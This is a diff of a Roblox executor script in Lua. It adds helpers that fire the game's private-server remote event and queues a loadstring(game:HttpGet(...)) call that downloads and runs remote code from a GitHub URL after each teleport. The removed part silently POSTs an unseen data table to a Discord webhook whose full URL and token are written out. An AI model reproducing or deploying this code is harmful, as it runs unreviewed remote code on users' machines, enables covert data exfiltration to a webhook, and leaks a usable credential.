@@ -33,92 +33,49 @@ local data = {
     }}
 }
 
-local HttpService = game:GetService("HttpService")
-local body = HttpService:JSONEncode(data)
+local function getDescendant(root, ...)
+    local current = root
+    for _, v in ipairs({...}) do
+        current = current and current:FindFirstChild(v)
+        if not current then return nil end
+    end
+    return current
+end
 
-pcall(function()
-    requestFunc({
-        Url = "https://discord.com/api/webhooks/1372245779133235372/VqoCrLm-E2SUvMHcUSlHG-8GJJu0ZdnNKQmzDqFvTeuD2pzBhruJAYV2L92K6DHd9os_",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = body
-    })
-end)
+local function getServerLabel()
+    local plr = game:GetService("Players").LocalPlayer
+    local label = getDescendant(plr, "PlayerGui", "Hub", "Container", "Window", "PrivateServer", "ServerLabel")
+    return label and label.Text or nil
+end
+
+local function ensurePrivateServer()
+    local label = getServerLabel()
+    if label and label:lower() == "none" then
+        local remote = game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.PrivateServer
+        print("[PS] Label is 'None'. Creating private server...")
+        remote:FireServer("Create")
+    else
+        print("[PS] Label:", label)
+    end
+end
+
+local function joinPrivateServer(region)
+    local label = getServerLabel()
+    if not label or label:lower() == "none" then
+        warn("[PS] No server code available!")
+        return
+    end
+    local remote = game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.PrivateServer
+    print(string.format("[PS] Joining Private Server: %s [%s]", label, region or "Unknown"))
+    remote:FireServer("Join", label, region or "JawaTengah")
+end
+
+local queueTeleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+if queueTeleport then
+    queueTeleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/metalis3z/masters/refs/heads/main/cars-mobil.lua"))()')
+    print("[PS] queue_on_teleport set!")
+end
 
 
-
-local TweenService = game:GetService("TweenService")
-local Players = game:GetService("Players")
-local SoundService = game:GetService("SoundService")
-local player = Players.LocalPlayer
-
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Parent = player:WaitForChild("PlayerGui")
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-ScreenGui.IgnoreGuiInset = true
-
-local Main = Instance.new("Frame")
-Main.Name = "Main"
-Main.Parent = ScreenGui
-Main.AnchorPoint = Vector2.new(0.5, 0.5)
-Main.Position = UDim2.new(0.5, 0, 1.5, 0) 
-Main.Size = UDim2.new(0, 287, 0, 139)
-Main.BackgroundColor3 = Color3.new(0, 0, 0)
-Main.BorderSizePixel = 0
-
-Instance.new("UICorner", Main)
-
-local ImageLabel = Instance.new("ImageLabel")
-ImageLabel.Parent = Main
-ImageLabel.Position = UDim2.new(0.319, 0, 0, 0)
-ImageLabel.Size = UDim2.new(0, 100, 0, 100)
-ImageLabel.Image = "rbxassetid://8922788417"
-ImageLabel.BackgroundTransparency = 1
-ImageLabel.BorderSizePixel = 0
-
-local Maintenance = Instance.new("TextLabel")
-Maintenance.Name = "Maintenance"
-Maintenance.Parent = Main
-Maintenance.Position = UDim2.new(0.5, 0, 0.72, 0) 
-Maintenance.AnchorPoint = Vector2.new(0.5, 0)
-Maintenance.Size = UDim2.new(0.9, 0, 0, 30)
-Maintenance.BackgroundTransparency = 1
-Maintenance.Font = Enum.Font.GothamBold
-Maintenance.Text = "Lunar is currently down"
-Maintenance.TextColor3 = Color3.new(1, 1, 1)
-Maintenance.TextStrokeTransparency = 0
-Maintenance.TextSize = 16
-Maintenance.TextWrapped = true
-
-TweenService:Create(Main, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-	Position = UDim2.new(0.5, 0, 0.5, 0)
-}):Play()
-
-local sound = Instance.new("Sound")
-sound.SoundId = "rbxassetid://276848267"
-sound.Volume = 1
-sound.PlayOnRemove = true
-sound.Parent = SoundService
-
-task.delay(5, function()
-	TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-		Position = UDim2.new(0.5, 0, -0.5, 0),
-		BackgroundTransparency = 1
-	}):Play()
-
-	TweenService:Create(Maintenance, TweenInfo.new(0.5), {
-		TextTransparency = 1,
-		TextStrokeTransparency = 1
-	}):Play()
-
-	TweenService:Create(ImageLabel, TweenInfo.new(0.5), {
-		ImageTransparency = 1
-	}):Play()
-
-	task.delay(0.6, function()
-		sound:Destroy() 
-		ScreenGui:Destroy()
-	end)
-end)
+ensurePrivateServer()
+joinPrivateServer("JawaTengah")
